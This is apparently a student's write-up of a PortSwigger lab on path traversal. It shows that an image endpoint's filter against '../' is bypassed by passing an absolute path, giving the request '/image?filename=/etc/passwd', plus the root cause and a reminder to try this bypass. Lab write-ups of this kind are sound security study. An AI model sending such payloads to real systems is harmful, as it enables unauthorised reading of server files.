# PortSwigger 02 - Absolute Path Bypass

## What I tested

I tested an image-loading endpoint:

```http
GET /image?filename=13.jpg
```

A random value returned:

```txt
"No such file"
```

## What I found

Instead of using `../`, an absolute path worked:

```http
GET /image?filename=/etc/passwd
```

## Why it matters

Blocking traversal sequences such as `../` is not enough if the backend still accepts full filesystem paths.

## Root cause

The application trusted the user-controlled `filename` parameter and did not verify the final resolved path.

## Impact

An attacker could read arbitrary files by providing absolute paths.

## Note to self

If `../` is blocked, try whether the backend accepts an absolute path directly.
